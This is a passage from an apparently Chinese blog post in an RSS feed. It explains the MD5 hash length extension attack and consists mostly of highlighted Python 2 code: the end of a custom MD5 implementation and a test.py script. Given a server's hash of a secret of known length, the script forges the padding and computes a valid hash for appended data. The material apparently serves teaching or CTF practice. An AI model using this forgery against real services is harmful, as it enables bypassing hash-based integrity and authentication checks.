        <span class="n">c</span><span class="o">=</span><span class="n">HH</span><span class="p">(</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">M15</span><span class="p">,</span><span class="mi">16</span><span class="p">,</span><span class="mh">0x1fa27cf8</span><span class="n">L</span><span class="p">)</span>
        <span class="n">b</span><span class="o">=</span><span class="n">HH</span><span class="p">(</span><span class="n">b</span><span class="p">,</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="n">M2</span><span class="p">,</span><span class="mi">23</span><span class="p">,</span><span class="mh">0xc4ac5665</span><span class="n">L</span><span class="p">)</span>
        <span class="c1">#Fourth round</span>
        <span class="n">a</span><span class="o">=</span><span class="n">II</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">,</span><span class="n">M0</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mh">0xf4292244</span><span class="n">L</span><span class="p">)</span>
        <span class="n">d</span><span class="o">=</span><span class="n">II</span><span class="p">(</span><span class="n">d</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">c</span><span class="p">,</span><span class="n">M7</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mh">0x432aff97</span><span class="n">L</span><span class="p">)</span>
        <span class="n">c</span><span class="o">=</span><span class="n">II</span><span class="p">(</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">M14</span><span class="p">,</span><span class="mi">15</span><span class="p">,</span><span class="mh">0xab9423a7</span><span class="n">L</span><span class="p">)</span>
        <span class="n">b</span><span class="o">=</span><span class="n">II</span><span class="p">(</span><span class="n">b</span><span class="p">,</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="n">M5</span><span class="p">,</span><span class="mi">21</span><span class="p">,</span><span class="mh">0xfc93a039</span><span class="n">L</span><span class="p">)</span>
        <span class="n">a</span><span class="o">=</span><span class="n">II</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">,</span><span class="n">M12</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mh">0x655b59c3</span><span class="n">L</span><span class="p">)</span>
        <span class="n">d</span><span class="o">=</span><span class="n">II</span><span class="p">(</span><span class="n">d</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">c</span><span class="p">,</span><span class="n">M3</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mh">0x8f0ccc92</span><span class="n">L</span><span class="p">)</span>
        <span class="n">c</span><span class="o">=</span><span class="n">II</span><span class="p">(</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">M10</span><span class="p">,</span><span class="mi">15</span><span class="p">,</span><span class="mh">0xffeff47d</span><span class="n">L</span><span class="p">)</span>
        <span class="n">b</span><span class="o">=</span><span class="n">II</span><span class="p">(</span><span class="n">b</span><span class="p">,</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="n">M1</span><span class="p">,</span><span class="mi">21</span><span class="p">,</span><span class="mh">0x85845dd1</span><span class="n">L</span><span class="p">)</span>
        <span class="n">a</span><span class="o">=</span><span class="n">II</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">,</span><span class="n">M8</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mh">0x6fa87e4f</span><span class="n">L</span><span class="p">)</span>
        <span class="n">d</span><span class="o">=</span><span class="n">II</span><span class="p">(</span><span class="n">d</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">c</span><span class="p">,</span><span class="n">M15</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mh">0xfe2ce6e0</span><span class="n">L</span><span class="p">)</span>
        <span class="n">c</span><span class="o">=</span><span class="n">II</span><span class="p">(</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">M6</span><span class="p">,</span><span class="mi">15</span><span class="p">,</span><span class="mh">0xa3014314</span><span class="n">L</span><span class="p">)</span>
        <span class="n">b</span><span class="o">=</span><span class="n">II</span><span class="p">(</span><span class="n">b</span><span class="p">,</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="n">M13</span><span class="p">,</span><span class="mi">21</span><span class="p">,</span><span class="mh">0x4e0811a1</span><span class="n">L</span><span class="p">)</span>
        <span class="n">a</span><span class="o">=</span><span class="n">II</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">,</span><span class="n">M4</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mh">0xf7537e82</span><span class="n">L</span><span class="p">)</span>
        <span class="n">d</span><span class="o">=</span><span class="n">II</span><span class="p">(</span><span class="n">d</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">c</span><span class="p">,</span><span class="n">M11</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mh">0xbd3af235</span><span class="n">L</span><span class="p">)</span>
        <span class="n">c</span><span class="o">=</span><span class="n">II</span><span class="p">(</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">M2</span><span class="p">,</span><span class="mi">15</span><span class="p">,</span><span class="mh">0x2ad7d2bb</span><span class="n">L</span><span class="p">)</span>
        <span class="n">b</span><span class="o">=</span><span class="n">II</span><span class="p">(</span><span class="n">b</span><span class="p">,</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="n">M9</span><span class="p">,</span><span class="mi">21</span><span class="p">,</span><span class="mh">0xeb86d391</span><span class="n">L</span><span class="p">)</span>


        <span class="n">A</span> <span class="o">+=</span> <span class="n">a</span>
        <span class="n">B</span> <span class="o">+=</span> <span class="n">b</span>
        <span class="n">C</span> <span class="o">+=</span> <span class="n">c</span>
        <span class="n">D</span> <span class="o">+=</span> <span class="n">d</span>

        <span class="n">A</span> <span class="o">=</span> <span class="n">A</span><span class="o">&amp;</span><span class="mh">0xffffffff</span>
        <span class="n">B</span> <span class="o">=</span> <span class="n">B</span><span class="o">&amp;</span><span class="mh">0xffffffff</span>
        <span class="n">C</span> <span class="o">=</span> <span class="n">C</span><span class="o">&amp;</span><span class="mh">0xffffffff</span>
        <span class="n">D</span> <span class="o">=</span> <span class="n">D</span><span class="o">&amp;</span><span class="mh">0xffffffff</span>

        <span class="n">a</span> <span class="o">=</span> <span class="n">A</span>
        <span class="n">b</span> <span class="o">=</span> <span class="n">B</span>
        <span class="n">c</span> <span class="o">=</span> <span class="n">C</span>
        <span class="n">d</span> <span class="o">=</span> <span class="n">D</span>
        <span class="k">print</span> <span class="s2">&#34;</span><span class="si">%x</span><span class="s2">,</span><span class="si">%x</span><span class="s2">,</span><span class="si">%x</span><span class="s2">,</span><span class="si">%x</span><span class="s2">&#34;</span><span class="o">%</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">)</span>

    <span class="k">return</span> <span class="n">show_md5</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">)</span>
</code></pre></td></tr></table>
</div>
</div><h3 id="testpy">test.py</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="c1"># -*- coding: utf-8 -*-</span>
<span class="kn">import</span> <span class="nn">my_md5</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">six</span>
<span class="n">MD5_Hash</span><span class="o">=</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
<span class="n">length</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
<span class="n">text</span><span class="o">=</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>

<span class="n">s1</span><span class="o">=</span><span class="nb">eval</span><span class="p">(</span><span class="s1">&#39;0x&#39;</span><span class="o">+</span><span class="n">MD5_Hash</span><span class="p">[:</span><span class="mi">8</span><span class="p">]</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;hex&#39;</span><span class="p">)[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;hex&#39;</span><span class="p">))</span>
<span class="n">s2</span><span class="o">=</span><span class="nb">eval</span><span class="p">(</span><span class="s1">&#39;0x&#39;</span><span class="o">+</span><span class="n">MD5_Hash</span><span class="p">[</span><span class="mi">8</span><span class="p">:</span><span class="mi">16</span><span class="p">]</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;hex&#39;</span><span class="p">)[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;hex&#39;</span><span class="p">))</span>
<span class="n">s3</span><span class="o">=</span><span class="nb">eval</span><span class="p">(</span><span class="s1">&#39;0x&#39;</span><span class="o">+</span><span class="n">MD5_Hash</span><span class="p">[</span><span class="mi">16</span><span class="p">:</span><span class="mi">24</span><span class="p">]</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;hex&#39;</span><span class="p">)[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;hex&#39;</span><span class="p">))</span>
<span class="n">s4</span><span class="o">=</span><span class="nb">eval</span><span class="p">(</span><span class="s1">&#39;0x&#39;</span><span class="o">+</span><span class="n">MD5_Hash</span><span class="p">[</span><span class="mi">24</span><span class="p">:</span><span class="mi">32</span><span class="p">]</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;hex&#39;</span><span class="p">)[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;hex&#39;</span><span class="p">))</span>

<span class="n">secret</span> <span class="o">=</span> <span class="s2">&#34;a&#34;</span><span class="o">*</span><span class="n">length</span>
<span class="n">test</span><span class="o">=</span><span class="n">secret</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\x80</span><span class="s1">&#39;</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">*</span><span class="p">((</span><span class="mi">512</span><span class="o">-</span><span class="n">length</span><span class="o">*</span><span class="mi">8</span><span class="o">-</span><span class="mi">8</span><span class="o">-</span><span class="mi">8</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span><span class="o">/</span><span class="mi">8</span><span class="p">)</span><span class="o">+</span><span class="n">six</span><span class="o">.</span><span class="n">int2byte</span><span class="p">(</span><span class="n">length</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\x00\x00\x00\x00\x00\x00\x00</span><span class="s1">&#39;</span><span class="o">+</span><span class="n">text</span>
<span class="n">s</span> <span class="o">=</span> <span class="n">my_md5</span><span class="o">.</span><span class="n">deal_rawInputMsg</span><span class="p">(</span><span class="n">test</span><span class="p">)</span>
<span class="n">r</span> <span class="o">=</span> <span class="n">my_md5</span><span class="o">.</span><span class="n">deal_rawInputMsg</span><span class="p">(</span><span class="n">secret</span><span class="p">)</span>
<span class="n">inp</span> <span class="o">=</span> <span class="n">s</span><span class="p">[</span><span class="nb">len</span><span class="p">(</span><span class="n">r</span><span class="p">):]</span>
<span class="k">print</span> <span class="s1">&#39;填充完的数据为:&#39;</span><span class="o">+</span><span class="n">test</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span>
<span class="k">print</span> <span class="s1">&#39;----------------------------------------------------------&#39;</span>
<span class="k">print</span> <span class="s1">&#39;扩充完的数据为(16进制):&#39;</span><span class="o">+</span><span class="n">s</span>
<span class="k">print</span> <span class="s1">&#39;----------------------------------------------------------&#39;</span>
<span class="k">print</span> <span class="s1">&#39;截取最后分组的数据(16进制):&#39;</span><span class="o">+</span><span class="n">inp</span>
<span class="k">print</span> <span class="s1">&#39;----------------------------------------------------------&#39;</span>

<span class="k">print</span>  <span class="s1">&#39;最终填充结果为:&#39;</span><span class="o">+</span><span class="nb">bytes</span><span class="p">(</span><span class="n">test</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;hex&#39;</span><span class="p">)</span>
<span class="k">print</span> <span class="s2">&#34;填充后的md5为:&#34;</span><span class="o">+</span><span class="n">my_md5</span><span class="o">.</span><span class="n">run_md5</span><span class="p">(</span><span class="n">s1</span><span class="p">,</span><span class="n">s2</span><span class="p">,</span><span class="n">s3</span><span class="p">,</span><span class="n">s4</span><span class="p">,</span><span class="n">inp</span><span class="p">)</span>
</code></pre></td></tr></table>
</div>
</div><p>脚本使用时第一个命令行参数是一个服务端加密一个固定长度数据的md5，第二个参数是固定的长度
例如已知服务端加密一个15字符的md5：test.py 571580b26c65f306376d4f64e53cb5c7 15</p>
<h4 id="参考文章">参考文章</h4>
<p><a href="https://www.cnblogs.com/p00mj/p/6288337.html" target="_blank" rel="noopener noreffer">MD5的Hash长度扩展攻击</a></p>]]></description></item></channel></rss>